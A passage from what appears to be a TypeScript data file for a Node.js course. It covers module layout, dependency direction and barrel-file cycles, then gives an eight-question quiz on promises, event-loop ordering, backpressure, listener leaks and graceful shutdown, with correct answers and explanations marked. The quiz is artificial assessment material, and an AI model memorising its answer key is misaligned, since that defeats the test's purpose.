**Dependency direction.** Business logic must not know about Express, pg or the filesystem. Depend inward: routes (HTTP) → service (rules) → repository (interface) → infrastructure (implementation). The composition root (\`app/container.ts\`) is the only file that knows the concrete implementations. Practical test: if you cannot call the service from a CLI or a worker without importing Express, the boundary has leaked.

**Barrel files.** An \`index.ts\` that re-exports a folder gives clean imports (\`import { createTask } from "@/features/tasks"\`) and defines the public surface. Two failure modes:

1. **Circular imports**: a.ts and b.ts both import the barrel, the barrel imports both — one module ends up partially initialised, and you get "cannot read property of undefined" that depends on import order.
2. **Hidden coupling and slow graphs**: importing one thing evaluates the whole folder.

Rule: barrels at the **boundary** only; inside a feature, import concrete files directly. Lint with \`import/no-cycle\`.

**Separation of concerns in practice.** A route handler does exactly three things: parse/validate input, call one use case, map the result (or a typed error) to an HTTP response. No SQL, no business rules, no \`req\` in the service layer. A \`utils.ts\` dumping ground is the smell that a real module name is missing.
    `,
    howItWorks: `
Your import graph is the runtime dependency graph. Node evaluates a module once, in import order, and ESM exports are live bindings — which saves you from some stale-value bugs but does not save you from using an \`undefined\` binding before its module finishes evaluating. That is exactly what a circular barrel produces: everything "imports fine" and still explodes at the first call. Direction rules (\`core\` never imports \`features\`, adapters depend on ports) are cheap to state and enforceable with lint rules and a CI check, and they keep the graph acyclic by construction.
    `,
    codeExamples: [
      {
        title: "A structure that scales past the third feature",
        language: "text",
        code: `src/
  app/                      # composition root — wiring only
    server.ts               # creates the http server, registers middleware
    container.ts            # constructs adapters, injects them into services
  core/                     # cross-cutting infrastructure
    config.ts               # env parsing + validation
    db.ts                   # pool
    logger.ts
    errors.ts               # AppError base, toHttp mapping
  features/
    tasks/
      tasks.routes.ts       # HTTP only: parse, validate, status codes
      tasks.service.ts      # business rules — imports no express, no pg
      tasks.repo.ts         # TaskRepository interface + implementation
      tasks.types.ts
      index.ts              # barrel: the public surface of this feature
    users/
      ...
  shared/
    http/async-handler.ts
    http/error-handler.ts`,
        description:
          "Feature folders for cohesion, core/ for infrastructure everyone shares, and a composition root as the single place that knows implementations. Adding a feature means adding one folder plus one wiring line.",
      },
      {
        title: "Dependency direction with a typed port",
        language: "ts",
        code: `// features/tasks/tasks.repo.ts — the PORT: what the service needs, not how it is done
export type TaskRow = { id: string; title: string; done: boolean };
export interface TaskRepository {
  listByUser(userId: string): Promise<TaskRow[]>;
  insert(row: Omit<TaskRow, "id">): Promise<TaskRow>;
}

// features/tasks/tasks.service.ts — no express, no pg, no filesystem
import type { TaskRepository } from "./tasks.repo.js";

export function createTaskService(repo: TaskRepository) {
  return {
    list: (userId: string) => repo.listByUser(userId),
    async create(userId: string, title: string) {
      if (title.length > 200) throw new Error("title too long"); // rules live HERE
      return repo.insert({ title, done: false });
    },
  };
}

// app/container.ts — the only file that knows the concrete adapter
import { pgTaskRepo } from "./infra/pg-task.repo.js";
import { createTaskService } from "../features/tasks/tasks.service.js";

export const taskService = createTaskService(pgTaskRepo);`,
        description:
          "The service depends on an interface; the container injects the implementation. The same service can back an HTTP route, a worker job or a CLI command without changing — that is what separation of concerns buys you.",
      },
    ],
    commonMistakes: [
      "Importing a folder's barrel from a file inside that same folder — a cycle that only breaks at runtime, depending on entry point.",
      "Express types (req/res) leaking into services, so the logic cannot be reused outside HTTP.",
      "A utils/ or helpers/ junk drawer that everyone imports from — hidden coupling, no ownership, no tests.",
      "Splitting only by layer, so one feature's change touches five directories and every branch conflicts.",
    ],
    bestPractices: [
      "Organize by feature; keep cross-cutting infra in core/; wire everything once in a composition root.",
      "Enforce direction: features may import core; core never imports features; adapters depend inward on ports.",
      "Use barrels only at a feature's public boundary and run import/no-cycle in lint.",
      "Name modules after domain language, keep files short enough to read in one sitting, and kill utils.ts on sight.",
    ],
    realWorldUseCases: [
      "A three-person team shipping weekly: feature folders mean two people rarely edit the same file.",
      "Extracting a batch CLI from an existing service — because services never imported HTTP, the CLI reuses them directly.",
    ],
    resources: [
      docs(
        "Node.js — ECMAScript modules",
        "https://nodejs.org/api/esm.html",
        "Evaluation order, live bindings and the resolution rules your import graph obeys.",
        "en",
        "reference",
      ),
      docs(
        "Node.js Best Practices",
        OFFICIAL.nodeBestPractices,
        "Section 11 covers project structure coding practices for Node.js services.",
        "en",
        "reference",
      ),
      ytSearch(
        "node.js project structure feature folder architecture",
        "Comparisons of layered vs feature-first layouts in real services.",
        "en",
        "15–30 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-restructure",
        title: "Restructure a project",
        prompt:
          "Take any project from earlier phases (or a scratch app) organised as routes/ + services/ + db/, and move it to feature folders with a core/. For each file you move, write one line stating which direction its imports may point. Count how many files changed for one hypothetical feature addition before and after.",
        difficulty: "intermediate",
        estimatedMinutes: 45,
        hints: [
          "Types and interfaces for the domain belong next to the feature, not in a shared types/ folder.",
          "The composition root is the only place allowed to import both an interface and its adapter.",
        ],
      },
      {
        id: "ex-p2m1-barrel-cycle",
        title: "Create and break a cycle",
        prompt:
          "Build a two-file feature with a barrel (a.ts, b.ts, index.ts) where a imports the barrel and b imports the barrel. Log at module top level and run it with both `node a-first` style entry points (or reorder imports) to observe partially initialised modules. Then fix it by importing concrete files directly, and explain the fix in two sentences.",
        difficulty: "intermediate",
        estimatedMinutes: 30,
        hints: [
          "Look for undefined bindings or logs appearing in an unexpected order.",
          "import/no-cycle is the lint rule that catches this before runtime.",
        ],
      },
    ],
    projectIds: ["p2-ecommerce-api"],
    quizId: "quiz-p2-m1",
  },
];

export const quiz: Quiz = {
  id: "quiz-p2-m1",
  moduleId: "p2-m1",
  title: "Module 1 quiz — Advanced JavaScript & Node.js",
  description:
    "Test your understanding of promise chains and combinators, event loop ordering, microtasks, backpressure, event emitters, process-level error handling and graceful shutdown.",
  questions: [
    {
      id: "q-p2m1-1",
      type: "multiple-choice",
      prompt:
        "You must fetch three independent resources and only proceed when ALL THREE succeeded; if any one fails you want to fail fast and receive that failure. Which combinator is correct?",
      options: [
        "Promise.all — rejects with the first rejection while the other promises keep running",
        "Promise.allSettled — never rejects and always resolves with per-promise status objects",
        "Promise.race — settles with the first promise to settle, whether fulfilled or rejected",
        "Promise.any — resolves with the first fulfillment and only rejects when every input rejects",
      ],
      correctIndex: 0,
      explanation:
        "Promise.all subscribes to every input immediately, resolves with the values in input order when all fulfil, and rejects with the FIRST rejection (fail fast). allSettled never rejects (use it when partial failure is acceptable), race settles on the first settlement of any kind, and any resolves on the first success — the opposite of 'all must succeed'.",
      optionExplanations: [
        "Correct — Promise.all is the fail-fast combinator for 'every input must succeed'.",
        "allSettled is right when you want a report of successes AND failures, not a fast failure.",
        "race would let a fast rejection win even though other inputs might still succeed.",
        "any only rejects when every input rejected, so one success hides the other failures.",
      ],
    },
    {
      id: "q-p2m1-2",
      type: "code-output",
      prompt: "What does this code print (in order)?",
      code: `console.log("A");
setTimeout(() => console.log("B"), 0);
Promise.resolve().then(() => console.log("C"));
queueMicrotask(() => console.log("D"));
console.log("E");`,
      language: "js",
      options: ["A, E, C, D, B", "A, E, D, C, B", "A, B, C, D, E", "A, C, D, E, B"],
      correctIndex: 0,
      explanation:
        "All synchronous code runs first (A, E). Then the microtask queue drains in registration order: the promise reaction C was queued before queueMicrotask's D. Only after microtasks are empty does the loop reach the timers phase and fire B. setTimeout(0) never runs before microtasks.",
      optionExplanations: [
        "Correct — sync (A, E), then microtasks in order (C, D), then timers (B).",
        "queueMicrotask was registered after the promise reaction, so C comes first.",
        "Timers never jump ahead of synchronous code or microtasks.",
        "E is synchronous, so it runs before any microtask, not after them.",
      ],
    },
    {
      id: "q-p2m1-3",
      type: "code-output",
      prompt: "What does this code print (in order)?",
      code: `async function f() {
  console.log("1");
  await null;
  console.log("2");
}
f();
console.log("3");
process.nextTick(() => console.log("4"));
console.log("5");`,
      language: "js",
      options: ["1, 3, 5, 4, 2", "1, 3, 4, 5, 2", "1, 3, 5, 2, 4", "1, 2, 3, 4, 5"],
      correctIndex: 0,
      explanation:
        "f() runs synchronously up to the await and prints 1; the rest of the caller prints 3 and 5. After the current operation ends, Node drains the process.nextTick queue (4) BEFORE the promise microtask queue, where the continuation of f() prints 2. This nextTick-before-microtask priority is a Node-specific ordering rule.",
      optionExplanations: [
        "Correct — sync (1, 3, 5), then nextTick (4), then the await continuation (2).",
        "The nextTick callback is queued after f() suspends, so 3 and 5 still print before it.",
        "The await continuation is a promise microtask, which runs after the nextTick queue.",
        "Nothing after the first await can print while the synchronous part is still running.",
      ],
    },
    {
      id: "q-p2m1-4",
      type: "find-bug",
      prompt:
        "In production this endpoint sometimes kills the entire Node.js process with ERR_UNHANDLED_REJECTION. What is the root cause?",
      code: `async function chargeCustomer(req, res) {
  const { cardId, amount } = req.body;
  const payment = await payments.charge(cardId, amount);

  await audit.record("charge", payment.id);

  res.json({ ok: true, id: payment.id });
}

app.post("/charge", chargeCustomer);`,
      language: "js",
      options: [
        "Express handlers may not be async — the framework throws synchronously",
        "The async handler returns a promise Express 4 ignores; a rejection from payments.charge or audit.record has no .catch, so Node treats it as an unhandled rejection and exits",
        "res.json() cannot be called after an await and must happen first",
        "payments.charge must be wrapped in try/catch inside audit.record, not in the handler",
      ],
      correctIndex: 1,
      explanation:
        "Express 4 does not consume the promise returned by an async handler (Express 5 and `next(err)` wrappers do). Any rejected await therefore becomes a rejected promise nobody handled. Since Node 15 the default `--unhandled-rejections` mode is `throw`, which is raised as an uncaught exception and exits with code 1 — exactly what you saw.",
      optionExplanations: [
        "Async handlers are perfectly legal; the problem is who consumes the returned promise.",
        "Correct — no one catches the rejection, so Node's default policy terminates the process.",
        "await is fine here; response ordering is not the failure mode.",
        "Wrapping one call inside another would just move the same unhandled rejection.",
      ],
    },
    {
      id: "q-p2m1-5",
      type: "short-answer",
      prompt:
        "Name the Node.js process event that fires when a promise is rejected and no handler is attached within a turn of the event loop. Answer with the event name only.",
      acceptedKeywords: ["unhandledrejection", "unhandled rejection"],
      explanation:
        "process.on('unhandledRejection', (reason, promise) => ...). If you install no listener at all, Node raises the rejection as an uncaught exception (default mode 'throw') and the process exits with code 1. The companion event 'rejectionHandled' fires when a handler is attached later than that first turn.",
    },
    {
      id: "q-p2m1-6",
      type: "multiple-choice",
      prompt:
        "While copying a large upload you call writable.write(chunk) in a loop and it returns false. What does that mean, and what must your code do?",
      options: [
        "The write failed and the chunk was discarded — you must write it again",
        "The stream's internal buffer is at or above highWaterMark — stop writing and wait for the 'drain' event before continuing",
        "The destination stream has ended — you must create a new one",
        "Nothing important; write() always returns true for Buffer chunks",
      ],
      correctIndex: 1,
      explanation:
        "write() returning false is backpressure: the consumer is slower than the producer and the writable's buffer (default 16 KiB for file streams) is full. The chunk is NOT lost — it is buffered. Continuing to write grows memory without bound. Correct code pauses the producer and resumes on 'drain' (or uses stream/promises pipeline, which does this for you).",
      optionExplanations: [
        "False does not mean failure; the data is buffered and will be flushed.",
        "Correct — honor backpressure: pause the source, wait for 'drain', then resume.",
        "An ended stream emits 'finish'/'close' (or errors); write() returning false is only about buffering.",
        "Ignoring the return value is the classic cause of OOM crashes on large uploads.",
      ],
    },
    {
      id: "q-p2m1-7",
      type: "find-bug",
      prompt:
        "After a few thousand clients connect and disconnect, memory grows without bound and Node prints MaxListenersExceededWarning. What is wrong?",
      code: `const bus = new EventEmitter();

app.get("/stream", (req, res) => {
  res.writeHead(200, { "content-type": "text/event-stream" });

  bus.on("message", (msg) => {
    res.write("data: " + msg + "\\n\\n");
  });

  res.on("close", () => {
    console.log("client gone");
  });
});`,
      language: "js",
      options: [
        "EventSource streams are not supported by the http module",
        "Every request adds a new listener to the long-lived bus and never removes it, so each closed connection leaves a listener that retains the response and its buffers",
        "res.writeHead may only be called once per process, not once per request",
        "EventEmitter.emit is asynchronous, so messages queue up unboundedly",
      ],
      correctIndex: 1,
      explanation:
        "The bus outlives every request. Registering bus.on(...) per request without bus.off(...)/once() in the close handler means listeners accumulate forever: the warning fires after 10 listeners per event, and each leaked closure keeps the request/response objects alive — a textbook 'heap grows with traffic' leak. Fix: keep a reference, remove it on close, or use once() for single-shot handshakes.",
      optionExplanations: [
        "The code uses raw HTTP, and SSE works fine on the http module.",
        "Correct — unbounded listener accumulation on a shared emitter; remove the listener on close.",
        "writeHead is per-response; that is not the issue.",
        "emit is synchronous; the problem is retention, not message queuing.",
      ],
    },
    {
      id: "q-p2m1-8",
      type: "multiple-choice",
      prompt:
        "Which sequence is the correct graceful shutdown for an HTTP server that receives SIGTERM (for example from Kubernetes during a deploy)?",
      options: [
        "Call process.exit(0) immediately so the orchestrator starts the replacement faster",
        "Stop accepting new connections with server.close(), let in-flight requests finish, close dependencies (database, queue) in reverse order, then exit with an explicit code — bounded by a timeout that force-exits if draining hangs",
        "Send SIGINT to yourself so the default handler terminates the process",
        "Wait for SIGINT instead, because SIGTERM cannot be handled in Node.js",
      ],
      correctIndex: 1,
      explanation:
        "server.close() stops accepting new connections but keeps serving existing ones; in-flight responses must complete before you close the database and exit. A timeout (for example 10s) guarantees you exit non-zero before the platform's grace period ends with a SIGKILL, which would cut connections without any cleanup. SIGTERM listeners are supported on POSIX; installing one removes the default kill behavior, so you must exit yourself.",
      optionExplanations: [
        "Immediate exit truncates in-flight responses and loses buffered logs — the opposite of graceful.",
        "Correct — stop accepting, drain, close dependencies, exit with a bounded timeout.",
        "Your SIGTERM handler already removed the default behavior; sending SIGINT just runs your handler again.",
        "SIGTERM is the standard shutdown signal on Linux containers and can be handled (it is emulated on Windows).",
      ],
    },
  ],
};
